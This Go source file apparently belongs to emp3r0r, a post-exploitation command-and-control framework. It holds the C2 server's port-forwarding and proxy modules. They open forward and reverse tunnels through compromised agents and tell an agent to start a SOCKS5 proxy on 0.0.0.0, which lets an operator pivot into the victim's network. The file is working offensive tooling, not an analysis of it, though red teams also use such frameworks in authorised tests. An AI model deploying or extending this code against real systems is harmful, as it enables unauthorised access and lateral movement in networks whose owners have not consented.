package modules

import (
	"context"
	"fmt"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// RegisterPortFwdFunc is a function to register a port mapping with the server
// It is set by the operator when it starts up
var RegisterPortFwdFunc func(def.PortFwdRequest) error

// UnregisterPortFwdFunc is a function to unregister a port mapping with the server
var UnregisterPortFwdFunc func(string) error

// GetPortFwdSessionsFunc is a function to get all active port forwarding sessions from the server
var GetPortFwdSessionsFunc func() ([]def.PortFwdSession, error)

func ModulePortFwd(ctx *c2context.C2Context) {
	switchOpt, ok := ctx.Flags["switch"]
	if !ok {
		logging.Errorf("Option 'switch' not found")
		return
	}

	// list command does not require active agent
	if switchOpt == "list" {
		// Get data
		sessions := GetPortFwdSessions()

		// Call UI callback if provided
		if ctx.OnUIReady != nil {
			ctx.OnUIReady(sessions)
		}
		return
	}

	activeAgent := ctx.Target
	if activeAgent == nil {
		logging.Errorf("No active agent")
		return
	}

	switch switchOpt {
	case "off":
		// ugly, i know, it will delete port mappings matching current lport-to combination
		found := false
		network.PortFwds.Range(func(id, value interface{}) bool {
			session := value.(*network.PortFwdSession)
			toOpt, ok := ctx.Flags["to"]
			if !ok {
				logging.Errorf("Option 'to' not found")
				return false // stop iteration
			}
			listenPortOpt, ok := ctx.Flags["listen_port"]
			if !ok {
				logging.Errorf("Option 'listen_port' not found")
				return false // stop iteration
			}
			if session.To == toOpt && session.Lport == listenPortOpt {
				session.Cancel()            // cancel the PortFwd session
				network.PortFwds.Delete(id) // remove from port mapping list

				// tell the agent to close connection
				// make sure handler returns
				// cmd format: !port_fwd [to/listen] [shID] [operation]
				cmd := fmt.Sprintf("%s --shID %s --operation stop", def.C2CmdPortFwd, id)
				sendCMDerr := CmdSender(cmd, "", activeAgent.Tag)
				if sendCMDerr != nil {
					logging.Errorf("SendCmd: %v", sendCMDerr)
				}
				found = true
				return false // stop iteration
			}
			return true
		})

		if !found {
			toOpt := ctx.Flags["to"]
			listenPortOpt := ctx.Flags["listen_port"]
			logging.Errorf("Could find port mapping (to %s, listening on %s)", toOpt, listenPortOpt)
		}
	case "reverse": // expose a dest from CC to agent
		var pf network.PortFwdSession
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = ctx.Flags["listen_port"], ctx.Flags["to"]

		// Get bind address option, default to localhost if not specified
		bindAddrOpt, ok := ctx.Flags["bind_addr"]
		if ok {
			pf.BindAddr = bindAddrOpt
		} else {
			pf.BindAddr = "127.0.0.1"
		}

		pf.SendCmdFunc = CmdSender
		pf.RegisterFunc = RegisterPortFwdFunc
		pf.UnregisterFunc = UnregisterPortFwdFunc
		pf.Agent = activeAgent
		pf.ShReady = make(chan struct{})
		go func() {
			logging.Printf("RunReversedPortFwd: %s:%s -> %s (%s), make a connection and it will appear in `ls_port_fwds`", pf.BindAddr, pf.Lport, pf.To, pf.Protocol)
			initErr := pf.InitReversedPortFwd()
			if initErr != nil {
				logging.Errorf("PortFwd (reverse) failed: %v", initErr)
			}
		}()
	case "on":
		var pf network.PortFwdSession
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = ctx.Flags["listen_port"], ctx.Flags["to"]

		// Get bind address option, default to localhost if not specified
		bindAddrOpt, ok := ctx.Flags["bind_addr"]
		if ok {
			pf.BindAddr = bindAddrOpt
		} else {
			pf.BindAddr = "127.0.0.1"
		}

		pf.SendCmdFunc = CmdSender
		pf.RegisterFunc = RegisterPortFwdFunc
		pf.UnregisterFunc = UnregisterPortFwdFunc
		pf.Protocol = ctx.Flags["protocol"]
		pf.Agent = activeAgent
		pf.ShReady = make(chan struct{})
		go func() {
			logging.Printf("RunPortFwd: %s:%s -> %s (%s), make a connection and it will appear in `ls_port_fwds`", pf.BindAddr, pf.Lport, pf.To, pf.Protocol)
			runErr := pf.RunPortFwd()
			if runErr != nil {
				logging.Errorf("PortFwd failed: %v", runErr)
			}
		}()
	default:
	}
}

func moduleProxy(ctx *c2context.C2Context) {
	activeAgent := ctx.Target
	if activeAgent == nil {
		logging.Errorf("No active agent")
		return
	}
	portOpt, ok := ctx.Flags["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	port := portOpt

	statusOpt, ok := ctx.Flags["status"]
	if !ok {
		logging.Errorf("Option 'status' not found")
		return
	}
	status := statusOpt

	// Get bind address option, default to localhost if not specified
	bindAddr := "127.0.0.1"
	bindAddrOpt, ok := ctx.Flags["bind_addr"]
	if ok {
		bindAddr = bindAddrOpt
		if bindAddr == "localhost" {
			bindAddr = "127.0.0.1"
		}
	}

	// port-fwd
	pf := new(network.PortFwdSession)
	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
	pf.Lport, pf.To = port, "127.0.0.1:"+live.RuntimeConfig.AgentSocksServerPort
	pf.BindAddr = bindAddr
	pf.SendCmdFunc = CmdSender
	pf.RegisterFunc = RegisterPortFwdFunc
	pf.UnregisterFunc = UnregisterPortFwdFunc
	pf.Description = fmt.Sprintf("Agent Proxy (TCP):\n%s:%s (Local) -> %s (Agent)", bindAddr, pf.Lport, pf.To)
	pf.Protocol = "tcp"
	pf.Timeout = live.RuntimeConfig.AgentSocksTimeout
	pf.Agent = activeAgent
	pf.ShReady = make(chan struct{})

	// udp port fwd
	pfu := new(network.PortFwdSession)
	pfu.Ctx, pfu.Cancel = context.WithCancel(context.Background())
	pfu.Lport, pfu.To = port, "127.0.0.1:"+live.RuntimeConfig.AgentSocksServerPort
	pfu.BindAddr = bindAddr
	pfu.Description = fmt.Sprintf("Agent Proxy (UDP):\n%s:%s (Local) -> %s (Agent)", bindAddr, pfu.Lport, pfu.To)
	pfu.Protocol = "udp"
	pfu.Timeout = live.RuntimeConfig.AgentSocksTimeout
	pfu.SendCmdFunc = CmdSender
	pfu.RegisterFunc = RegisterPortFwdFunc
	pfu.UnregisterFunc = UnregisterPortFwdFunc
	pfu.Agent = activeAgent
	pfu.ShReady = make(chan struct{})

	switch status {
	case "on":
		// tell agent to start local socks5 proxy
		job_id := uuid.NewString()
		err := CmdSender("!proxy --mode on --addr 0.0.0.0:"+live.RuntimeConfig.AgentSocksServerPort, job_id, pf.Agent.Tag)
		if err != nil {
			logging.Errorf("ModulePortFwd: failed to start socks proxy: %v", err)
			return
		}
		// var ok bool // ok is already declared
		for range 10 {
			time.Sleep(1 * time.Second)
			_, ok = live.CmdResults.Load(job_id)
			if ok {
				live.CmdResults.Delete(job_id)
				break
			}
			util.TakeABlink()
		}

		if !ok {
			logging.Errorf("Timeout waiting for agent to start SOCKS5 proxy")
			return
		} else {
			logging.Printf("Agent started SOCKS5 proxy")
			// TCP forwarding
			go func() {
				err := pf.RunPortFwd()
				if err != nil {
					logging.Errorf("PortFwd (TCP) failed: %v", err)
				}
			}()
			// UDP forwarding
			go func() {
				err := pfu.RunPortFwd()
				if err != nil {
					logging.Errorf("PortFwd (UDP) failed: %v", err)
				}
			}()
		}
	case "off":
		network.PortFwds.Range(func(id, value interface{}) bool {
			session := value.(*network.PortFwdSession)
			if session.Description == pf.Description ||
				session.Description == pfu.Description {
				session.Cancel() // cancel the PortFwd session

				// tell the agent to close connection
				// make sure handler returns
				cmd := fmt.Sprintf("%s --id %s", def.C2CmdDeletePortFwd, id)
				err := CmdSender(cmd, "", session.Agent.Tag)
				if err != nil {
					logging.Errorf("SendCmd: %v", err)
				}
			}
			return true
		})
	default:
		logging.Errorf("Unknown operation '%s'", status)
	}
}
